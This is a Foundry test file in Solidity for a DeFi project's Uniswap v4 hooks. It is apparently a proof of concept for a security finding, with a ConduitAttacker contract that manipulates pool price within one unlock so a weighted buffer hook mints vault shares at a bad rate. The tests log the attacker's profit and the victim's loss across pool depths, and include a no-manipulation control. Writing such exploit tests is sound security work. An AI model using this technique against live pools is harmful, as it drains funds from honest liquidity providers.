// SPDX-License-Identifier: BSL-1.1
pragma solidity ^0.8.0;

import {console2} from "forge-std/console2.sol";
import {Math} from "@crane/contracts/utils/Math.sol";
import {IERC20} from "@crane/contracts/interfaces/IERC20.sol";
import {IPoolManager} from "@crane/contracts/protocols/dexes/uniswap/v4/interfaces/IPoolManager.sol";
import {IUnlockCallback} from "@crane/contracts/protocols/dexes/uniswap/v4/interfaces/callback/IUnlockCallback.sol";
import {IHooks} from "@crane/contracts/protocols/dexes/uniswap/v4/interfaces/IHooks.sol";
import {PoolKey} from "@crane/contracts/protocols/dexes/uniswap/v4/types/PoolKey.sol";
import {PoolIdLibrary} from "@crane/contracts/protocols/dexes/uniswap/v4/types/PoolId.sol";
import {Currency} from "@crane/contracts/protocols/dexes/uniswap/v4/types/Currency.sol";
import {SwapParams} from "@crane/contracts/protocols/dexes/uniswap/v4/types/PoolOperation.sol";
import {TickMath} from "@crane/contracts/protocols/dexes/uniswap/v4/libraries/TickMath.sol";
import {StateLibrary} from "@crane/contracts/protocols/dexes/uniswap/v4/libraries/StateLibrary.sol";
import {TransientStateLibrary} from "@crane/contracts/protocols/dexes/uniswap/v4/libraries/TransientStateLibrary.sol";
import {SimpleMintableERC20} from "contracts/test/stubs/SimpleMintableERC20.sol";
import {IStandardExchangeIn} from "@crane/contracts/interfaces/IStandardExchangeIn.sol";
import {IUniswapV4SeBufferHook} from "contracts/hooks/uniswap/v4/interfaces/IUniswapV4SeBufferHook.sol";
import {IUniswapV4StandardExchangeWeightedBufferHook as WeightedHook} from "contracts/hooks/uniswap/v4/standardExchange/weighted/interfaces/IUniswapV4StandardExchangeWeightedBufferHook.sol";
import {UniswapV4StandardExchangeWeightedBufferHookPairPoolLib as WeightedPair} from "contracts/hooks/uniswap/v4/standardExchange/weighted/UniswapV4StandardExchangeWeightedBufferHookPairPoolLib.sol";
import {SeMatrixFixture} from "test/foundry/spec/hooks/uniswap/v4/standardExchange/SeMatrixFixture.sol";
import {FullSpreadSameManagerWeightedFixture as WeightedFixture} from "test/foundry/spec/hooks/uniswap/v4/standardExchange/FullSpreadSameManagerWeightedFixture.sol";
import {TestBase_UniswapV4FullSpreadPonsFamilyHook as PBase} from "contracts/vaults/standard/exchange/protocols/uniswap/v4/fullSpread/ponsFamilyV2Hook/test/bases/TestBase_UniswapV4FullSpreadPonsFamilyHook.sol";
import {TestBase_UniswapV4FullSpreadPonsFamilyHook_Acceptance as PAcceptance} from "contracts/vaults/standard/exchange/protocols/uniswap/v4/fullSpread/ponsFamilyV2Hook/test/bases/TestBase_UniswapV4FullSpreadPonsFamilyHook_Acceptance.sol";
import {ERC20PermitMintableStub} from "@crane/contracts/tokens/ERC20/ERC20PermitMintableStub.sol";

interface IJoinFlex {
    function joinProportionalFlexible(uint256[] calldata amounts, bool[] calldata amountIsSeShare, address to, uint256 sharesMin, uint256 deadline) external returns (uint256, uint256[] memory);
}

interface IPonsReserve {
    function deployedReserve() external view returns (uint256, uint256);
    function canOpenPoolManagerUnlock() external view returns (bool);
}

/// @notice Unprivileged attacker. One PM.unlock: push Pons pool price, swap face->raw through the weighted
/// hook (hook buffers face into the Pons SE in blocked mode), push price back, settle all deltas from own balance.
contract ConduitAttacker is IUnlockCallback {
    using StateLibrary for IPoolManager;
    using TransientStateLibrary for IPoolManager;
    using PoolIdLibrary for PoolKey;

    IPoolManager immutable pm;
    address immutable hook;
    IERC20 immutable face; // pons token0
    IERC20 immutable other; // pons token1
    IERC20 immutable raw;
    PoolKey ponsKey;
    PoolKey wKey;

    uint256 public rawOut;
    uint256 public faceIn;
    uint256 public sharesMinted;
    address immutable se;

    constructor(IPoolManager pm_, address hook_, address se_, PoolKey memory ponsKey_, PoolKey memory wKey_, IERC20 raw_) {
        pm = pm_; hook = hook_; se = se_; ponsKey = ponsKey_; wKey = wKey_; raw = raw_;
        face = IERC20(Currency.unwrap(ponsKey_.currency0));
        other = IERC20(Currency.unwrap(ponsKey_.currency1));
        raw_.approve(hook_, type(uint256).max);
        face.approve(hook_, type(uint256).max);
    }

    function attack(uint256 sqrtMulBps, uint256 aIn) external {
        pm.unlock(abi.encode(uint8(0), sqrtMulBps, aIn));
    }

    function sellRawViaPM() external {
        pm.unlock(abi.encode(uint8(1), uint256(0), raw.balanceOf(address(this))));
    }

    /// idle exit (PM locked): permissionless hook exchangeIn raw -> face
    function sellRawIdle() external returns (uint256) {return IStandardExchangeIn(hook).exchangeIn(raw, raw.balanceOf(address(this)), face, 0, address(this), false, block.timestamp);
    }

    function unlockCallback(bytes calldata data) external returns (bytes memory) {
        require(msg.sender == address(pm), "pm only");
        (uint8 op, uint256 mulBps, uint256 a) = abi.decode(data, (uint8, uint256, uint256));
        if (op == 0) {
            require(!IPonsReserve(se).canOpenPoolManagerUnlock(), "se not blocked");
            (uint160 sp0,,,) = pm.getSlot0(ponsKey.toId());
            if (mulBps != 10_000) {
                // token1 in, token0 (face) out -> face scarce in the SE book
                pm.swap(ponsKey, SwapParams(false, -int256(1e30), uint160(uint256(sp0) * mulBps / 10_000)), "");
            }
            uint256 s0 = IERC20(se).totalSupply();
            bool zfo = address(face) == Currency.unwrap(wKey.currency0);
            pm.swap(wKey, SwapParams(zfo, -int256(a), zfo ? TickMath.MIN_SQRT_PRICE + 1 : TickMath.MAX_SQRT_PRICE - 1), "");
            sharesMinted = IERC20(se).totalSupply() - s0;
            faceIn = a;
            if (mulBps != 10_000) {
                pm.swap(ponsKey, SwapParams(true, -int256(1e30), sp0), "");
                (uint160 sp1,,,) = pm.getSlot0(ponsKey.toId());
                require(sp1 == sp0, "price not restored");
            }
        } else {
            bool zfo = address(raw) == Currency.unwrap(wKey.currency0);
            pm.swap(wKey, SwapParams(zfo, -int256(a), zfo ? TickMath.MIN_SQRT_PRICE + 1 : TickMath.MAX_SQRT_PRICE - 1), "");
        }
        uint256 r0 = raw.balanceOf(address(this));
        _settleAll(address(face));
        _settleAll(address(other));
        _settleAll(address(raw));
        if (op == 0) rawOut = raw.balanceOf(address(this)) - r0;
        return "";
    }

    function _settleAll(address t) internal {
        Currency c = Currency.wrap(t);
        int256 d = pm.currencyDelta(address(this), c);
        if (d < 0) {
            pm.sync(c);
            IERC20(t).transfer(address(pm), uint256(-d));
            pm.settle();
        } else if (d > 0) {
            pm.take(c, address(this), uint256(d));
        }
    }
}

contract PonsBlockedConduitTest is PAcceptance {
    using StateLibrary for IPoolManager;
    using PoolIdLibrary for PoolKey;

    address hook;
    SimpleMintableERC20 raw;
    PoolKey wKey;
    ConduitAttacker attacker;
    address hookOwner = makeAddr("hookOwner");
    uint256 constant ATK_CAP = 10_000_000e18;

    /// external (non-vault) full-range LP depth in the Pons pool, in token units at P=1
    function _extUnits() internal pure virtual returns (uint256) { return 2_000; }
    function _bootstrapUnits() internal pure virtual returns (uint256) { return 100; }
    function _hookFaceUnits() internal pure virtual returns (uint256) { return 2_000; }

    function setUp() public virtual override {
        PBase.setUp();
        IERC20 a = IERC20(address(new ERC20PermitMintableStub("Pair A", "A", 18, address(this), 1e32)));
        IERC20 b = IERC20(address(new ERC20PermitMintableStub("Pair B", "B", 18, address(this), 1e32)));
        bool ordered = address(a) < address(b);
        token0 = ordered ? a : b; token1 = ordered ? b : a;
        unit0 = 1e18; unit1 = 1e18;
        poolKey = PoolKey(Currency.wrap(address(token0)), Currency.wrap(address(token1)), 0, _tickSpacing(), IHooks(address(ponsHook)));
        ponsHook.registerPool(poolKey, address(token1), address(this), address(this), _creatorTaxBps(), false, ponsHook.currentFeePolicy());
        poolManager.initialize(poolKey, uint160(1 << 96));
        _seedPool(uint128(_extUnits() * 1e18));
        vault = IStandardExchangeProxy_(uniswapV4StandardExchangeDFPkg.deployVault(poolKey));
        token0.approve(address(vault), type(uint256).max);
        token1.approve(address(vault), type(uint256).max);
        // honest SE LP: normal idle dual deposit
        _bootstrapN(_bootstrapUnits());

        // weighted buffer hook (50/50) on the same PoolManager; face = token0 buffered into the Pons SE
        raw = new SimpleMintableERC20("DETF-like raw", "RAW");
        SeMatrixFixture.Ctx memory c;
        c.create3Factory = create3Factory; c.indexedexManager = indexedexManager; c.owner = owner;
        c.erc20Facet = erc20Facet; c.erc5267Facet = erc5267Facet; c.erc2612Facet = erc2612Facet;
        c.multiAssetBasicVaultFacet = multiAssetBasicVaultFacet; c.multiAssetStandardVaultFacet = multiAssetStandardVaultFacet;
        {
            IFacetRegistry registry = IFacetRegistry(address(create3Factory));
            HookFactory factory = HookFactoryService.deployUniswapV4HookDiamondPackageCallBackFactory(create3Factory,
                HookFactory.InitArgs(registry.canonicalFacet(type(IERC165).interfaceId), registry.canonicalFacet(type(IDiamondLoupe).interfaceId),
                    registry.canonicalFacet(type(IERC8109Introspection).interfaceId), registry.canonicalFacet(type(IPostDeployAccountHook).interfaceId),
                    HookFactoryService.deployUniswapV4HookFlagsFacet(create3Factory)));
            vm.prank(owner);
            IVaultRegistryDeployment(address(indexedexManager)).setHookDiamondPackageFactory(address(factory));
        }
        hook = WeightedFixture.deploy(c, address(poolManager), address(vault), address(token0), address(raw), hookOwner);
        wKey = WeightedPair.pairKey(address(token0), address(raw), WeightedPair.TICK_SPACING, IHooks(hook));

        // honest hook owner (DETF stand-in): idle dual deposit into the SE, then joins the hook with the SE shares + raw
        uint256 fF = _hookFaceUnits() * 1e18;
        token0.transfer(hookOwner, fF);
        token1.transfer(hookOwner, fF);
        raw.mint(hookOwner, 2 * fF);
        vm.startPrank(hookOwner);
        token0.approve(address(vault), type(uint256).max);
        token1.approve(address(vault), type(uint256).max);
        uint256 hs;
        {
            address[] memory toks = new address[](2); toks[0] = address(token0); toks[1] = address(token1);
            uint256[] memory da = new uint256[](2); da[0] = fF; da[1] = fF;
            hs = IStandardExchangeInMulti_(address(vault)).exchangeInManyToOne(toks, da, IERC20(address(vault)), 0, hookOwner, false, block.timestamp);
        }
        IERC20(address(vault)).approve(hook, type(uint256).max);
        raw.approve(hook, type(uint256).max);
        uint256[] memory amts = new uint256[](2);
        bool[] memory isSe = new bool[](2);
        uint256 fi = address(token0) < address(raw) ? 0 : 1;
        amts[fi] = hs; isSe[fi] = true;
        amts[1 - fi] = 2 * fF;
        IJoinFlex(hook).joinProportionalFlexible(amts, isSe, hookOwner, 0, block.timestamp);
        vm.stopPrank();
        require(IERC20(address(vault)).balanceOf(hook) == hs, "hook holds SE shares");

        attacker = new ConduitAttacker(poolManager, hook, address(vault), poolKey, wKey, IERC20(address(raw)));
        token0.transfer(address(attacker), ATK_CAP);
        token1.transfer(address(attacker), ATK_CAP);
    }

    function _bootstrapN(uint256 n) internal {
        address[] memory toks = new address[](2); toks[0] = address(token0); toks[1] = address(token1);
        uint256[] memory amts = new uint256[](2); amts[0] = n * 1e18; amts[1] = n * 1e18;
        IStandardExchangeInMulti_(address(vault)).exchangeInManyToOne(toks, amts, IERC20(address(vault)), 0, address(this), false, block.timestamp);
    }

    // SE NAV at the restored price P=1 (18/18): free + deployed (earned fees excluded)
    function _seNav() internal view returns (uint256) {
        (uint256 d0, uint256 d1) = IPonsReserve(address(vault)).deployedReserve();
        return token0.balanceOf(address(vault)) + token1.balanceOf(address(vault)) + d0 + d1;
    }

    function _claim(address who) internal view returns (uint256) {
        return _seNav() * IERC20(address(vault)).balanceOf(who) / IERC20(address(vault)).totalSupply();
    }

    function _atkValue() internal view returns (uint256) {
        return token0.balanceOf(address(attacker)) + token1.balanceOf(address(attacker));
    }

    function _maxIn(uint256 mulBps) internal returns (uint256 best) {
        // largest face input the hook accepts under manipulation (MAX_IN_RATIO), found by trial
        uint256 hi = _hookFaceUnits() * 1e18;
        uint256 lo = 0;
        for (uint256 i; i < 24; ++i) {
            uint256 mid = (lo + hi) / 2;
            uint256 snap = vm.snapshotState();
            bool ok;
            try attacker.attack(mulBps, mid) { ok = true; } catch {}
            vm.revertToState(snap);
            if (ok) lo = mid; else hi = mid;
        }
        best = lo * 98 / 100;
    }

    function _run(uint256 mulBps, string memory label) internal returns (int256 profit, int256 victimDelta) {
        uint256 aIn = _maxIn(mulBps);
        console2.log("====", label);
        (uint256 d0, uint256 d1) = IPonsReserve(address(vault)).deployedReserve();
        console2.log("pons pool liquidity", uint256(poolManager.getLiquidity(poolKey.toId())));
        console2.log("SE free0/free1", token0.balanceOf(address(vault)), token1.balanceOf(address(vault)));
        console2.log("SE deployed0/deployed1", d0, d1);
        uint256 S0 = IERC20(address(vault)).totalSupply();
        uint256 nav0 = _seNav();
        console2.log("SE NAV/supply", nav0, S0);
        console2.log("hook SE shares (h num)", IERC20(address(vault)).balanceOf(hook));
        uint256 hookRaw0 = raw.balanceOf(hook);
        uint256 vic0 = _claim(hook) + _claim(address(this));
        uint256 atk0 = _atkValue();
        console2.log("face input a", aIn);

        attacker.attack(mulBps, aIn);
        console2.log("SE shares minted to hook", attacker.sharesMinted());
        console2.log("fair shares for a (a*S0/NAV0)", aIn * S0 / nav0);
        console2.log("raw received", attacker.rawOut());
        uint256 got = attacker.sellRawIdle();
        console2.log("face from idle raw sell-back", got);
        console2.log("hook raw before/after", hookRaw0, raw.balanceOf(hook));

        uint256 vic1 = _claim(hook) + _claim(address(this));
        profit = int256(_atkValue()) - int256(atk0);
        victimDelta = int256(vic1) - int256(vic0);
        console2.log("ATTACKER NET PROFIT (face+other @P=1, all pons/hook fees paid)");
        console2.logInt(profit);
        console2.log("VICTIM (hook + honest SE LP) SE-claim delta @P=1");
        console2.logInt(victimDelta);
        console2.log("hook raw delta (should be ~0)");
        console2.logInt(int256(raw.balanceOf(hook)) - int256(hookRaw0));
    }

    function test_k2() public virtual {
        _run(15_000, "sqrtP x1.5 (k=2.25)");
    }

    function test_k4() public virtual {
        (int256 p, int256 v) = _run(20_000, "sqrtP x2 (k=4)");
        assertGt(p, 0, "attacker profit");
        assertLt(v, 0, "victim loss");
    }

    function test_k9() public virtual {
        (int256 p, int256 v) = _run(30_000, "sqrtP x3 (k=9)");
        assertGt(p, 0, "attacker profit");
        assertLt(v, 0, "victim loss");
    }

    function test_control_noPush() public {
        (int256 p,) = _run(10_000, "control, no push");
        assertLe(p, 0, "no profit without manipulation");
    }
}

/// SE ~18% of Pons pool depth
contract PonsBlockedConduitQuarterPoolTest is PonsBlockedConduitTest {
    function _extUnits() internal pure override returns (uint256) { return 8_000; }
    function test_k4() public override { _run(20_000, "QUARTER POOL k=4"); }
    function test_k9() public override { _run(30_000, "QUARTER POOL k=9"); }
}

/// SE ~4% of Pons pool depth
contract PonsBlockedConduitMidPoolTest is PonsBlockedConduitTest {
    function _extUnits() internal pure override returns (uint256) { return 40_000; }
    function test_k4() public override { _run(20_000, "MID POOL k=4"); }
    function test_k9() public override { _run(30_000, "MID POOL k=9"); }
}

/// project default acceptance depth (1e6 units external)
contract PonsBlockedConduitDeepPoolTest is PonsBlockedConduitTest {
    function _extUnits() internal pure override returns (uint256) { return 1_000_000; }
    function test_k4() public override { _run(20_000, "DEEP POOL k=4"); }
    function test_k9() public override { _run(30_000, "DEEP POOL k=9"); }
}

import {IERC165} from "@crane/contracts/interfaces/IERC165.sol";
import {IFacetRegistry} from "@crane/contracts/interfaces/IFacetRegistry.sol";
import {IDiamondLoupe} from "@crane/contracts/interfaces/IDiamondLoupe.sol";
import {IERC8109Introspection} from "@crane/contracts/interfaces/IERC8109Introspection.sol";
import {IPostDeployAccountHook} from "@crane/contracts/interfaces/IPostDeployAccountHook.sol";
import {IVaultRegistryDeployment} from "contracts/interfaces/IVaultRegistryDeployment.sol";
import {IUniswapV4HookDiamondPackageCallBackFactory as HookFactory} from "contracts/hooks/uniswap/v4/factory/interfaces/IUniswapV4HookDiamondPackageCallBackFactory.sol";
import {UniswapV4HookDiamondPackageCallBackFactory_FactoryService as HookFactoryService} from "contracts/hooks/uniswap/v4/factory/UniswapV4HookDiamondPackageCallBackFactory_FactoryService.sol";
import {IStandardExchangeProxy as IStandardExchangeProxy_} from "contracts/interfaces/proxies/IStandardExchangeProxy.sol";
import {IStandardExchangeInMulti as IStandardExchangeInMulti_} from "contracts/interfaces/IStandardExchangeInMulti.sol";
